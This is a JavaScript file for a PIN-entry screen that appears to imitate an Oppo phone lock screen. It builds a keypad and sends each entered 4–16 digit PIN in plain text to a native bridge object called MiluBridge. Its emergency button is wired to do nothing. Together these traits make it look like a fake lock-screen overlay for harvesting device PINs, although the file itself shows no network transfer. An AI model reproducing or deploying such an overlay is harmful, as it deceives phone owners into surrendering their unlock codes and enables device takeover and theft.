(() => {
  const i18n = window.OppoPinI18n;
  if (i18n && typeof i18n.applyToDocument === "function") {
    i18n.applyToDocument();
  }

  const params = new URLSearchParams(window.location.search);
  const minLen = 4;
  const maxLenRaw = Number(params.get("max") || params.get("len") || "16");
  const MAX_LEN = maxLenRaw >= 4 && maxLenRaw <= 16 ? maxLenRaw : 16;
  const DEFAULT_VISIBLE_DOTS = 4;

  const slotsEl = document.getElementById("pinSlots");
  const keypadEl = document.getElementById("keypad");
  const emergencyBtn = document.getElementById("emergencyBtn");
  const backspaceLabel =
    i18n && typeof i18n.backspaceAria === "function" ? i18n.backspaceAria() : "Delete";
  const confirmLabel =
    i18n && typeof i18n.confirmLabel === "function" ? i18n.confirmLabel() : "OK";

  let value = "";
  let submitting = false;

  function bridge() {
    try {
      return window.MiluBridge || null;
    } catch (_) {
      return null;
    }
  }

  function reportDone(payload) {
    const b = bridge();
    if (b && typeof b.done === "function") {
      try {
        b.done(payload);
      } catch (_) {
        /* ignore */
      }
    }
  }

  function visibleDotCount() {
    return Math.min(MAX_LEN, Math.max(DEFAULT_VISIBLE_DOTS, value.length));
  }

  function renderSlots() {
    const count = visibleDotCount();
    slotsEl.innerHTML = "";
    for (let i = 0; i < count; i += 1) {
      const dot = document.createElement("span");
      dot.className = `pin-dot${i < value.length ? " is-filled" : ""}`;
      slotsEl.appendChild(dot);
    }
  }

  function clearPin() {
    value = "";
    submitting = false;
    renderSlots();
  }

  function canSubmit() {
    return value.length >= minLen && value.length <= MAX_LEN;
  }

  function submitPin() {
    if (submitting || !canSubmit()) {
      return;
    }
    submitting = true;
    reportDone(value);
    window.setTimeout(() => {
      clearPin();
    }, 420);
  }

  function appendDigit(digit) {
    if (submitting || value.length >= MAX_LEN) {
      return;
    }
    value += digit;
    renderSlots();
  }

  function backspace() {
    if (submitting || !value.length) {
      return;
    }
    value = value.slice(0, -1);
    renderSlots();
  }

  function makeKey(label, options) {
    const btn = document.createElement("button");
    btn.type = "button";
    btn.className = `key ${options.className || ""}`.trim();
    if (options.html) {
      btn.innerHTML = options.html;
    } else {
      btn.textContent = label;
    }
    if (options.ariaLabel) {
      btn.setAttribute("aria-label", options.ariaLabel);
    }
    if (options.disabled) {
      btn.disabled = true;
    }
    if (options.onClick) {
      btn.addEventListener("click", (event) => {
        event.preventDefault();
        options.onClick();
      });
    }
    return btn;
  }

  function buildKeypad() {
    keypadEl.innerHTML = "";
    for (let n = 1; n <= 9; n += 1) {
      keypadEl.appendChild(
        makeKey(String(n), {
          className: "key--digit",
          onClick: () => appendDigit(String(n)),
        }),
      );
    }
    keypadEl.appendChild(
      makeKey("", {
        className: "key--backspace",
        ariaLabel: backspaceLabel,
        html:
          '<svg viewBox="0 0 24 24" aria-hidden="true"><path fill="currentColor" d="M22 3H7c-.6 0-1.1.3-1.4.8l-5.1 7.2c-.3.4-.3 1 0 1.4l5.1 7.2c.3.5.8.8 1.4.8h15c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm0 16H7.5l-4.3-6 4.3-6H22v12zm-5.7-2.3 1.4-1.4-2.3-2.3 2.3-2.3-1.4-1.4-2.3 2.3-2.3-2.3-1.4 1.4 2.3 2.3-2.3 2.3 1.4 1.4 2.3-2.3 2.3 2.3z"/></svg>',
        onClick: () => backspace(),
      }),
    );
    keypadEl.appendChild(
      makeKey("0", {
        className: "key--digit",
        onClick: () => appendDigit("0"),
      }),
    );
    keypadEl.appendChild(
      makeKey(confirmLabel, {
        className: "key--confirm",
        ariaLabel: confirmLabel,
        onClick: () => submitPin(),
      }),
    );
  }

  emergencyBtn.addEventListener("click", (event) => {
    event.preventDefault();
  });

  let touchX = null;
  document.addEventListener(
    "touchstart",
    (event) => {
      touchX = event.changedTouches[0]?.clientX ?? null;
    },
    { passive: true },
  );
  document.addEventListener(
    "touchend",
    (event) => {
      if (touchX == null) {
        return;
      }
      const endX = event.changedTouches[0]?.clientX ?? touchX;
      if (touchX - endX > 64) {
        backspace();
      }
      touchX = null;
    },
    { passive: true },
  );

  buildKeypad();
  renderSlots();
})();
